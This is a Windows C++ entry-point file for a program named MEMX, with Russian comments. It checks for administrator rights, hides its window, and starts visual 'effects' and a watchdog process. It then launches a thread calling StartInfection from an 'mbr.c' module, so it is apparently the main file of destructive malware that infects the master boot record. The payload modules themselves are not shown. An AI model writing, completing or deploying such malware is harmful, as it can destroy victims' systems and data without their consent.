#include <windows.h>
#include <cstdio>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:WinMainCRTStartup")

// ================================================================
// ВНЕШНИЕ ОБЪЯВЛЕНИЯ
// ================================================================

extern void StartEffects();      // из effects.cpp
extern void StartWatchdog();     // из watchdog.cpp

#ifdef __cplusplus
extern "C" {
#endif
    int IsAdmin(void);
    void StartInfection(void);   // из mbr.c
#ifdef __cplusplus
}
#endif

// ================================================================
// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
// ================================================================

volatile bool g_running = true;

// ================================================================
// ТОЧКА ВХОДА
// ================================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {

    // ====== РЕЖИМ WATCHDOG ======
    if (strstr(lpCmdLine, "/watchdog")) {
        while (TRUE) Sleep(5000);
        return 0;
    }

    // ====== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ======
    if (!IsAdmin()) {
        MessageBoxA(NULL, "Run as administrator!", "MEMX", MB_ICONERROR);
        return 1;
    }

    // ====== СОЗДАНИЕ СКРЫТОГО ОКНА ======
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = DefWindowProcA;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MEMXClass";
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(0, "MEMXClass", "MEMX",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT,
        1, 1, NULL, NULL, hInstance, NULL);
    ShowWindow(hwnd, SW_HIDE);

    // ====== ЗАПУСК ЭФФЕКТОВ (из effects.cpp) ======
    StartEffects();

    // ====== ЗАПУСК WATCHDOG (из watchdog.cpp) ======
    StartWatchdog();

    // ====== ЗАПУСК ЗАРАЖЕНИЯ (из mbr.c) ======
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartInfection, NULL, 0, NULL);

    // ====== ЦИКЛ ОБРАБОТКИ СООБЩЕНИЙ ======
    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}